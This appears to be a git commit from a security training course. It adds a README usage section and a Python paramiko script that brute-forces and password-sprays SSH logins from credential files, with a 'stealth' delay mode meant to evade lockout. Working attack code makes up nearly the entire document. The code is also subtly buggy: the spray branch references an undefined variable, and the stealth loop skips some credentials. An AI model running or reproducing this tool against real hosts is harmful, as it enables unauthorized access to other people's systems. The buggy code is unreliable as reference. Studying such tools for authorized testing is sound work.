4f159778fd5877432aa304e3d96e0c379a685256
swtornio <swtornio@gmail.com>
2022-01-06 11:17:06 -0600

    minimum viable ssh login bruter/sprayer

--- project3/README.md
+++ project3/README.md
@@ -9,3 +9,24 @@ Scenario: You are working on an internal penetration test for Red Planet and hav
 ## Expert Task: Add the option to limit login attempts based on time. Example, run 5 login attempts, wait 60 seconds, run 5 more attempts, wait 60 seconds, repeat.
 
 In order to test this you will need a service running SSH. I suggest setting up something on your local network to test against. Be mindful when setting this up, if you put something internet facing with a weak username/password combination you run the risk at someone on the internet doing the same thing we are and getting popped.
+
+
+(env) mac@MacBook-Pro project3 % python ssh_login.py --help                                   
+usage: ssh_login.py [-h] [-t TARGET] [-p PORT] [--credfile CREDFILE] [--brute] [--userfile USERFILE] [--spray]
+                    [--password PASSWORD] [--stealth] [--attempts ATTEMPTS] [--delay DELAY]
+
+Search for a provided list of queries.
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -t TARGET, --target TARGET
+                        Target hostname or IP
+  -p PORT, --port PORT  SSH port
+  --credfile CREDFILE   Load comma-separated credentials from file for brute force
+  --brute               Brute force attack using comma-separated file of usernames and passwords
+  --userfile USERFILE   Load usernames from file for password spray
+  --spray               Perform password spray using provided file containing usernames and a specified password
+  --password PASSWORD   Password to use with --spray
+  --stealth             Perform a number of logins, then delay a specified time
+  --attempts ATTEMPTS   Number of attempts before delay.
+  --delay DELAY         Time to delay between attempts (in seconds)
---
+++ project3/ssh_login.py
@@ -0,0 +1,87 @@
+# Beginner Task: Write a script that will perform a password spray
+# against the SSH service using a single username and password list.
+# It should output each time a username/password combination is failed,
+# and stop on a successful log in.
+
+import argparse
+import getpass
+import paramiko
+import sys
+import time
+
+def ssh_login(ip, port, user, passwd):
+
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    print(f"Attempting {user}:{passwd}")
+    try:
+        client.connect(ip, port=port, username=user, password=passwd)
+        return True
+    except:
+        print("Connection failed")
+        return False
+
+
+
+if __name__ == '__main__':
+
+
+    parser = argparse.ArgumentParser(
+        description='Search for a provided list of queries.')
+    parser.add_argument('-t', '--target', default='127.0.0.1',
+                        help='Target hostname or IP')
+    parser.add_argument('-p', '--port', default='22', help='SSH port')
+    parser.add_argument('--credfile', default='default_creds.txt',
+                        help='Load comma-separated credentials from file for brute force')
+    parser.add_argument('--brute', default=False, action='store_true',
+                        help='Brute force attack using comma-separated file of usernames and passwords')
+    parser.add_argument('--userfile', default='default_users.txt',
+                        help='Load usernames from file for password spray')
+    parser.add_argument('--spray', default=False, action='store_true',
+                        help='Perform password spray using provided file containing usernames and a specified password')
+    parser.add_argument('--password', default='password', help='Password to use with --spray')
+    parser.add_argument('--stealth', default=False, action='store_true', help='Perform a number of logins, then delay a specified time')
+    parser.add_argument('--attempts', default=5, type=int, help='Number of attempts before delay.')
+    parser.add_argument('--delay', default=60, type=int, help='Time to delay between attempts (in seconds)')
+
+
+    args = parser.parse_args()
+
+    ip = args.target
+    port = args.port
+    delay = args.delay
+    stealth = args.stealth
+    attempted = 0
+
+    # brute force
+    if args.brute:
+        with open(args.credfile, "r") as creds_file:
+            credentials = creds_file.readlines()
+            for credential in credentials:
+                user, password = credential.split(",")
+                if attempted >= args.attempts:
+                    time.sleep(delay)
+                    attempted = 0
+                else:
+                    if stealth == True:
+                        attempted += 1
+                    if ssh_login(ip, port, user, password.rstrip()):
+                        print(f"Successful login as {user}:{password.rstrip()}.")
+                        sys.exit()
+
+    # credential spray
+    if args.spray:
+        with open(args.userfile) as userfile:
+            users = userfile.readlines()
+            for user in users:
+                if attempted >= args.attempts:
+                    time.sleep(delay)
+                    attempted = 0
+                else:
+                    print("attempted is", attempted)
+                    if stealth == True:
+                        attempted += 1
+                    if ssh_login(ip, port, user.rstrip(), args.password):
+                        print(f"Successful login as {user}:{password.rstrip()}.")
+                    
+
